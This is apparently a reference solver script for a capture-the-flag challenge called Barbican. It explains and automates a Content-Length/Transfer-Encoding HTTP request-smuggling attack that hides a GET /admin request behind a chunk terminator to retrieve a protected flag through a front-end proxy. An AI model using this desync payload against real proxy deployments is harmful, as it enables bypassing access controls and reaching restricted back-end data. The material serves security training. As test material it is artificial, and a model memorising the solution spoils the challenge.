#!/usr/bin/env python3
"""
ZSCTF :: Barbican -- reference solver.

Intended path (exploits only what is in plain sight in challenge/app.py):

  1. The edge refuses `GET /admin` from the public side (403). The upstream will
     serve `/admin` to anything that reaches it, because it trusts the edge.

  2. The two tiers frame a request body differently:
       - the EDGE frames the body by Content-Length and forwards the request
         line, headers and exactly that many body bytes to the upstream;
       - the UPSTREAM, when a request carries a chunked transfer-coding, decodes
         the body as chunked and treats "0\\r\\n\\r\\n" as the end of the body.
     So a single request whose Content-Length covers a trailing, chunk-terminated
     block is seen by the edge as ONE request (path "/app", allowed) but by the
     upstream as TWO requests -- the second being whatever we hid after the
     "0\\r\\n\\r\\n". We hide `GET /admin`.

  3. The edge multiplexes onto a single long-lived upstream connection and reads
     exactly one response per forwarded request. After the crafted request, the
     upstream has queued TWO responses (for "/app" and for the hidden "/admin");
     the edge returns the first and leaves the second buffered. Our next, benign
     `GET /app` is answered with that buffered `/admin` response -- the flag.

The deployment blocks egress and never publishes the upstream's loopback port,
so there is no way to reach the upstream directly: the desync is the only way in.

Usage:
    python solve.py --url http://HOST:PORT
"""
import sys
import re
import socket
import argparse
from urllib.parse import urlsplit


def recv_one_response(reader_buf, sock):
    """Read exactly one HTTP/1.1 response (framed by Content-Length). Returns
    (raw_response_bytes, leftover_buffer)."""
    buf = reader_buf
    while b"\r\n\r\n" not in buf:
        data = sock.recv(65536)
        if not data:
            break
        buf += data
    head, _, rest = buf.partition(b"\r\n\r\n")
    cl = 0
    for line in head.split(b"\r\n")[1:]:
        if line.lower().startswith(b"content-length:"):
            cl = int(line.split(b":", 1)[1].strip() or b"0")
            break
    body = rest
    while len(body) < cl:
        data = sock.recv(65536)
        if not data:
            break
        body += data
    full = head + b"\r\n\r\n" + body[:cl]
    leftover = body[cl:]
    return full, leftover


def solve(base):
    u = urlsplit(base)
    host = u.hostname
    port = u.port or 80

    # The hidden second request the upstream will parse out of the chunked body.
    smuggled = (b"GET /admin HTTP/1.1\r\n"
                b"Host: upstream\r\n"
                b"\r\n")
    # A chunk-terminated body: "0\r\n\r\n" closes the first (chunked) body for the
    # upstream; the smuggled request follows it inside the same Content-Length.
    desync_body = b"0\r\n\r\n" + smuggled

    req_a = (b"POST /app HTTP/1.1\r\n"
             b"Host: " + host.encode() + b"\r\n"
             b"Content-Length: " + str(len(desync_body)).encode() + b"\r\n"
             b"Transfer-Encoding: chunked\r\n"
             b"\r\n") + desync_body

    # A benign follow-up that will be answered with the queued /admin response.
    req_b = (b"GET /app HTTP/1.1\r\n"
             b"Host: " + host.encode() + b"\r\n"
             b"\r\n")

    s = socket.create_connection((host, port), timeout=20)
    s.settimeout(20)
    leftover = b""
    try:
        s.sendall(req_a)
        resp1, leftover = recv_one_response(leftover, s)   # answer to "/app"
        s.sendall(req_b)
        resp2, leftover = recv_one_response(leftover, s)    # queued "/admin"
    finally:
        s.close()

    # Integrity: accept only a flag served by the live upstream admin area, and
    # reject anything carrying the QA-fixture marker (the published decoy).
    source = re.search(rb"(?im)^X-Flag-Source:\s*(\S+)", resp2)
    src = source.group(1).decode() if source else "<none>"
    m = re.search(rb"(zerosecurectf\{[^}]*\})", resp2)
    if not m:
        raise SystemExit("[-] no flag in the queued response:\n" + resp2.decode("latin-1")[:400])
    flag = m.group(1).decode()

    if "sample" in flag or src != "live-admin":
        raise SystemExit("[-] got a fixture/decoy flag (source=%s): %s -- rejecting" % (src, flag))

    print("[+] desync delivered the queued /admin response (X-Flag-Source=%s)" % src)
    return flag


def main():
    ap = argparse.ArgumentParser(description="Barbican reference solver (CL/TE request desync).")
    ap.add_argument("--url", required=True, metavar="http://HOST:PORT",
                    help="base URL of the running Barbican edge")
    args = ap.parse_args()
    try:
        flag = solve(args.url)
    except OSError as e:
        print("[-] network error talking to %s: %s" % (args.url, e))
        return 1
    print("[+] FLAG =", flag)
    return 0


if __name__ == "__main__":
    sys.exit(main())
